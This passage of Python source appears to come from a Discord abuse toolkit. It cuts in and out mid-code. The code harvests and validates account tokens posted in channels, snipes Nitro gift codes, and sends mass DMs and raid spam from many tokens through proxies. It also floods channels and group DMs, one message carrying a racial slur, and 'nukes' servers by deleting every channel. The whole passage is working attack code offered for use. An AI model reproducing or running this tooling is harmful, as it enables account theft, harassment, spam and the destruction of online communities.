"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
            if response.status_code == 200: 
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"```✅ Token : ['{arg2}'] : is valid```"
                })  
            else:
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"```❌ Token : ['{arg2}'] : is invalid```"
                })  
        if data and data[0]["content"].startswith(f"{PREFIX}spam") and data[0]['author']['id'] == ALLOWED_USER_ID:
            msg = data[0]["content"].split() 
            if len(msg) >= 2:
                arg4 = msg[1]
            else:
                arg4 = None
            for i in range(100):
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"{arg4}"
                })     

        if data and data[0]["content"].startswith(f"{PREFIX}tokenpart") and data[0]['author']['id'] == ALLOWED_USER_ID:
            id3 = data[0]["content"].split()  
            if len(id3) >=2:
                arg5 = id3[1]
            else:
                arg5 = None
            encodedBytes = base64.b64encode(arg5.encode("utf-8"))
            encodedStr = str(encodedBytes, "utf-8")
            url = f'https://discord.com/api/users/{arg5}' 
            response = requests.get(url, headers=HEADERS)   
            data = response.json()
            username = data['username']  
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```📨 {username} First Token Part / {encodedStr}```"
            }) 
    
        if data and data[0]["content"].startswith(f"{PREFIX}deletewebhook") and data[0]['author']['id'] == ALLOWED_USER_ID:
            bh = data[0]["content"].split()
            if len(bh) >=2:
                arg6 = bh[1]
            else:
                arg6 = None
            requests.delete(arg6)
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```✅ Deleted Webhook ['{arg6}']```"
            }) 
        sniped_nitros = []
        data = requests.get(f"https://discord.com/api/v6/channels/{CHANNEL_ID}/messages", headers=HEADERS).json()
        if data and data[0]["content"].startswith(""):
            message = data[0]["content"]
            if message.startswith("discord.gift/"):
                code = message.split("discord.gift/")[1]
                if code not in sniped_nitros:
                    sniped = False
                    response = requests.get(f"https://discordapp.com/api/v8/entitlements/gift-codes/{code}", headers=HEADERS)
                    if response.status_code == 200:
                        gift = response.json()
                        if gift["uses"] == gift["max_uses"] or gift["expires_at"] is not None:
                            print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.YELLOW}['discord.gift/{code}']{Fore.RESET} (Already claimed or expired)")
                        else:
                            claim_response = requests.post(f"https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem", headers=HEADERS)
                            if claim_response.status_code == 200:
                                print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.GREEN}['discord.gift/{code}']{Fore.RESET} (Successfully claimed)")
                                sniped_nitros.append(code)
                                sniped = True
                            else:
                                print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.RED}['discord.gift/{code}']{Fore.RESET} (Failed to claim)")
                    else:
                        print(f"{Fore.BLUE}[>] : Invalid Nitro Sniped {Fore.RED}['discord.gift/{code}']")
                    if sniped:
                        break
            if message.startswith("https://discord.gift/"):
                code = message.split("https://discord.gift/")[1]
                if code not in sniped_nitros:
                    sniped = False
                    response = requests.get(f"https://discordapp.com/api/v8/entitlements/gift-codes/{code}", headers=HEADERS)
                    if response.status_code == 200:
                        gift = response.json()
                        if gift["uses"] == gift["max_uses"] or gift["expires_at"] is not None:
                            print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.YELLOW}['discord.gift/{code}']{Fore.RESET} (Already claimed or expired)")
                        else:
                            claim_response = requests.post(f"https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem", headers=HEADERS)
                            if claim_response.status_code == 200:
                                print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.GREEN}['discord.gift/{code}']{Fore.RESET} (Successfully claimed)")
                                sniped_nitros.append(code)
                                sniped = True
                            else:
                                print(f"{Fore.BLUE}[>] : Nitro Sniped {Fore.RED}['discord.gift/{code}']{Fore.RESET} (Failed to claim)")
                    else:
                        print(f"{Fore.BLUE}[>] : Invalid Nitro Sniped {Fore.RED}['discord.gift/{code}']")
                    if sniped:
                        break
        
        if data[0]["content"] == f"{PREFIX}nitrosniper" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```⚡ Nitro Sniper is Running on ['{CHANNEL_ID}'] - Free Version```"
            })
        if data and data[0]["content"].startswith(f"{PREFIX}infoid") and data[0]['author']['id'] == ALLOWED_USER_ID:
            message4 = data[0]["content"]
            if len(message4) >=2:
                arg7 = message4[1]
            else:
                arg7 = None  
            response = requests.get(f"https://discord.com/api/users/{arg7}")
            if response.status_code == 200:
                user_data = response.json()
                username = user_data["username"]
                discriminator = user_data["discriminator"]
                avatar_url = f"https://cdn.discordapp.com/avatars/{arg7}/{user_data['avatar']}"
                if user_data["public_flags"] & 1:
                    bio = user_data["bio"]
                else:
                    bio = None
                if user_data["public_flags"] & (1 << 1):
                    banner_url = f"https://cdn.discordapp.com/banners/{arg7}/{user_data['banner']}"
                else:
                    banner_url = None
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                     "content": f"""```{username}#{discriminator}'s UserID Infos ✅
🪞 Avatar : {avatar_url}
📨 About me : {bio}
🧵 Users Banner : {banner_url}```"""
                })
            else:
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"```❌ : Requests Errors, Try aigan next time ):```"
                })
        if data and data[0]["content"].startswith(f"{PREFIX}createthread") and data[0]['author']['id'] == ALLOWED_USER_ID:
            message8 = data[0]["content"].split()
            if len(message8) >=2:
                argx = message8[1]
            else:
                argx = None  
            CHANNEL_ID1 = data[0]["channel_id"]
            payload = {
                'name': f'{argx}',
                'type': 11,
                'auto_archive_duration': 60,
                'channel_id': f'{CHANNEL_ID}'
            }
            response = requests.post(f'https://discord.com/api/v9/channels/{CHANNEL_ID1}/threads', headers=HEADERS, json=payload)

        if data and data[0]["content"].startswith(f"{PREFIX}threadspam") and data[0]['author']['id'] == ALLOWED_USER_ID:
            messagex = data[0]["content"].split()
            if len(messagex) >=2:
                argx1 = messagex[1]
            else:
                argx1 = None  
            payload = {
                'name': f'FXOSA',
                'type': 11,
                'auto_archive_duration': 60,
                'channel_id': f'{CHANNEL_ID}'
            }
            for i in range(int(argx1)):
                response = requests.post(f'https://discord.com/api/v9/channels/{CHANNEL_ID}/threads', headers=HEADERS, json=payload)


        if data and data[0]["content"].startswith(f"{PREFIX}groupspam") and data[0]['author']['id'] == ALLOWED_USER_ID:
            xd = data[0]["content"].split()
            if len(xd) >=2:
                arg99 = xd[1]
            else:
                arg99 = None
            group = "bypasstool.xyz"
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```⚡: Spamming Groups with nigga / {arg99}```"
            })
            for i in range(10):
                try:
                    r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=HEADERS,
                                      json={"recipients": []})
                    jsr = json.loads(r.content)
                    groupID = jsr['id']
                    time.sleep(0.5)
                    r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=HEADERS,
                                        json={'name': group})
                    if r1.status_code == 200:
                        print(f'{Fore.BLUE}[>]{Fore.LIGHTGREEN_EX} Group Created. ~/> {arg99}')
                except:
                    pass
                r2 = requests.put(f'https://discord.com/api/v9/channels/{groupID}/recipients/{arg99}',
                                      headers = {'Authorization': f'{TOKEN}',
                                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                                                 'Origin': 'discord.com',
                                                 'Accept': '*/*',
                                                 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                                                 'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'})
                if r2.status_code == 204:
                    pass
        if data and data[0]["content"].startswith(f"{PREFIX}fuckchat") and data[0]['author']['id'] == ALLOWED_USER_ID:
            howmuch = data[0]["content"].split()
            if len(howmuch) >=2:
                amo = howmuch[1]
            else:
                amo = None
            xoxo = """
x












































































x
"""
            for i in range(int(amo)):
                requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                    "content": f"""{xoxo}"""
                }) 
        if data and data[0]["content"].startswith(""):
            message = data[0]["content"]
            if message.startswith("MTA"):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": message,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200:
                    print(f'{Fore.BLUE}[>] Valid Token Sniped: {Fore.LIGHTGREEN_EX}{message}')
                else:
                    print(f'{Fore.BLUE}[>] Invalid Token Sniped: {Fore.LIGHTRED_EX}{message}')
        if data and data[0]["content"].startswith(""):
            message = data[0]["content"]
            if message.startswith("OT"):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": message,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200:
                    print(f'{Fore.BLUE}[>] Valid Token Sniped: {Fore.LIGHTGREEN_EX}{message}')
                else:
                    print(f'{Fore.BLUE}[>] Invalid Token Sniped: {Fore.LIGHTRED_EX}{message}') 

        if data[0]["content"] == f"{PREFIX}tokensniper" and data[0]['author']['id'] == ALLOWED_USER_ID:
            requests.post(SEND_MESSAGE_URL.format(channel_id=CHANNEL_ID), headers=HEADERS, json={
                "content": f"```⚡ TokenSniper is Running on ['{CHANNEL_ID}'] - Free Version```"
            })   

def massdm():
    os.system('cls')
    counttokens = len(open('data/tokens.txt').readlines())
    countids = len(open('data/member_ids.txt').readlines())
    print(f"{Fore.WHITE}→ PUT A ROTATING PROXIE IN {Fore.LIGHTGREEN_EX}config.json{Fore.WHITE}, otherwise its DMING with {Fore.LIGHTRED_EX}your IP{Fore.WHITE} ←")
    ctypes.windll.kernel32.SetConsoleTitleW(f"BYPASSTOOL-MASSDM-FREE    |    Tokens Loaded [{counttokens}]    |    MemberIds Loaded [{countids}]    |    bypasstool.xyz")

    with open('config.json', 'r') as f:
        data = json.load(f)
        first_line = data.get("rotating_proxie")
        xdelay = data.get("massdm_delay")

    def dmid(token, user_id, msgmsg):
        url = "https://discord.com/api/users/@me/channels"
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
        data = {
            "recipient_id": user_id
        }
        prox = {
          'http': first_line,
          'https': first_line
        }
        response = requests.post(url, headers=headers, json=data)
        time.sleep(xdelay)
        if response.status_code == 200:
            channel_id = response.json()["id"]
            url = f"https://discord.com/api/channels/{channel_id}/messages"
            data = {
                "content": msgmsg
            }
            response = requests.post(url, headers=headers, json=data, proxies=prox)
            if response.status_code == 429:
                print(f"{Fore.LIGHTRED_EX}[ERROR]{Fore.WHITE}: {Fore.LIGHTRED_EX}{token}{Fore.WHITE} CAPTCHA ): buy the paid version for the solver.. {Fore.LIGHTRED_EX}https://bypasstool.xyz")
            if response.status_code == 204:
                print(f"{Fore.LIGHTBLUE_EX}[SUCCESS]{Fore.WHITE}: Sent Message on {Fore.LIGHTBLUE_EX}{token}{Fore.WHITE} to {Fore.LIGHTBLUE_EX}{user_id}")
            elif response.status_code == 200:
                print(f"{Fore.LIGHTBLUE_EX}[SUCCESS]{Fore.WHITE}: Sent Message on {Fore.LIGHTBLUE_EX}{token}{Fore.WHITE} to {Fore.LIGHTBLUE_EX}{user_id}")
            elif response.status_code == 403:
                print(f"{Fore.LIGHTRED_EX}[CLOSED]{Fore.WHITE}: {Fore.LIGHTRED_EX}{token}{Fore.WHITE} User Has DM's Closed: {Fore.LIGHTRED_EX}{user_id}")
            elif response.status_code == 404:
                print(f"{Fore.LIGHTRED_EX}[ERROR]{Fore.WHITE}: Couldn't DM on {Fore.LIGHTRED_EX}{token} {response.status_code}") 
            elif response.status_code == 201:
                print(f"{Fore.LIGHTBLUE_EX}[CREATED]{Fore.WHITE}: DM Created but Couldnt Sent Message")   
            elif response.status_code == 400:
                print(f"{Fore.LIGHTRED_EX}[ERROR]{Fore.WHITE}: {Fore.LIGHTRED_EX}{token}{Fore.WHITE} CAPTCHA ): buy the paid version for the solver.. {Fore.LIGHTRED_EX}https://bypasstool.xyz")
    
        if response.status_code == 429: 
            print(f"{Fore.LIGHTRED_EX}[LOCKED]{Fore.WHITE}: Token: {Fore.LIGHTRED_EX}{token}{Fore.WHITE} is Locked.")   
        else:
            print(f"{Fore.LIGHTRED_EX}[ERROR]{Fore.WHITE}: Failed To Recieve {Fore.LIGHTRED_EX}DM CHANNEL")

    tokens = []
    with open("data/tokens.txt", "r") as f:
        tokens = f.read().splitlines()
    user_ids = []
    with open("data/member_ids.txt", "r")as x:
        user_ids = x.read().splitlines()
    msgmsg = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}MESSAGE{Fore.LIGHTBLUE_EX}]: ")

    for i, user_id in enumerate(user_ids):
        token = tokens[i % len(tokens)]
        dmid_thread = threading.Thread(target=dmid, args=(token, user_id, msgmsg))
        dmid_thread.start()
        dmid_thread.join()

    input(f"{Fore.LIGHTGREEN_EX}[SUCCESS{Fore.LIGHTGREEN_EX}]: Sent All Dms")

def advraid():
    with open('data/member_ids.txt') as f:
        member_ids = f.read().splitlines()
    with open('data/tokens.txt') as f:
        tokens = f.read().splitlines()

    CHANNEL_ID = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Channel ID ?: ")
    MESSAGE = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Message ?: ")
    PING = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Amout To Ping ?: ")
    RING = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Amout of Emojis ?: ")
    url = f'https://discord.com/api/v9/channels/{CHANNEL_ID}/messages'

    messages = [MESSAGE, MESSAGE]

    def send_message(token):
        headers = {'Authorization': f'{token}',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                   'Origin': 'discord.com',
                   'Accept': '*/*',
                   'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                   'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
        for message in messages:
            emojilist = ['😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😇', '😉', '😊', '🙂', '🙃', '😋', '😌', '😍', '🥰', '😘', '😗', '😙', '😚', '😜', '😝', '😛', '🤑', '🤗', '🤔', '🤭', '🤫', '🤥', '😏', '😒', '😞', '😔', '😟', '😕', '🙁', '☹️', '😣', '😖', '😫', '😩', '🥺', '😢', '😭', '😤', '😠', '😡', '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰', '😥', '😓', '🤗', '🙄', '😶', '😐', '😑', '😬', '🤨', '😔', '😕', '🙃', '🤢', '🤮', '🤧', '😷', '🥴', '😴', '💤', '💩', '👻', '💀', '☠️', '👽', '👾', '🤖', '🎃', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾']
            ezem = random.sample(emojilist, int(RING))
            emmen = " ".join([f"{em}" for em in ezem])
            member_ids_selected = random.sample(member_ids, int(PING))
            members_mentioned = " ".join([f"<@{id}>" for id in member_ids_selected])
            message_with_member_id = f'{members_mentioned} ```{message}``` {emmen}'

            data = {'content': message_with_member_id}
            response = requests.post(url, headers=headers, json=data)
            print(response.text)

    while True:
        threads = []
        for token in tokens:
            thread = threading.Thread(target=send_message, args=(token,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

def faketyping():
    CHANNELID = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}ChannelID ?: ")

    with open('data/tokens.txt') as f:
        tokens = f.read().splitlines()

    while True:
        for token in tokens:
            headers = {'Authorization': f'{token}',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                       'Origin': 'discord.com',
                       'Accept': '*/*',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                       'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
            response = requests.post(f'https://discord.com/api/v9/channels/{CHANNELID}/typing', headers=headers)
            if response.status_code == 204:
                print(f'{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Started Typing on: {Fore.LIGHTBLUE_EX}{token}')
            else:
                print(f'{Fore.LIGHTRED_EX}[{Fore.WHITE}>{Fore.LIGHTRED_EX}]: {Fore.WHITE}Error Typing on: {Fore.LIGHTRED_EX}{token}')

def servnuke():
    clear()
    b = Fore.BLUE
    print(f'{w}[{b}/{w}] » i would 100% recommend to use a VPN!!')
    b = Fore.BLUE

    TOKEN = input(f'{w}[{b}TOKEN{w}] BOT TKN » ')
    GUILDID = input(f'{w}[{b}GUILD{w}] ID » ')
    CHANNELID = input(f'{w}[{b}CHANNEL{w}] ID » ')
    intents = discord.Intents.all()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear()
        print(f'{w}[{b}/{w}] » Logged in as {client.user.name}')
        print(f'{w}[{b}/{w}] » say "$cmds" for all the commands')

    @client.event
    async def on_message(message):
        if message.content.startswith('$create'):
            try:
                amount = int(message.content.split()[1])
            except IndexError:
                amount = 1

            try:
                message_content = ' '.join(message.content.split()[2:])
            except IndexError:
                message_content = 'Hello, world!'

            await message.delete()
            guild = message.guild

            async def create_channel(i):
                channel = await guild.create_text_channel(f'{message_content}')
                for i in range(1000):
                    await channel.send(message_content)

            coroutines = []

            for i in range(amount):
                c = create_channel(i)
                coroutines.append(c)

            await asyncio.gather(*coroutines)

        elif message.content.startswith('$deletech'):
            await message.delete() 
            guild = message.guild

            async def delete_all_channels():
                for channel in guild.text_channels:
                    await channel.delete()

            c = delete_all_channels()

            await c
            thread = threading.Thread(target=delete_all_channels)
            thread.start()
            for i in range(300):
                thread.join()
        elif message.content.startswith('$cmds'):
            desc = '''
```
$create (amout) (message)
```
**Mass Creates Discord Channels and spams a message**

```
$deletech
```
**Deletes all Channels in a Discord Server**

```
$role (name)
```
**Mass Creates Roles**

```
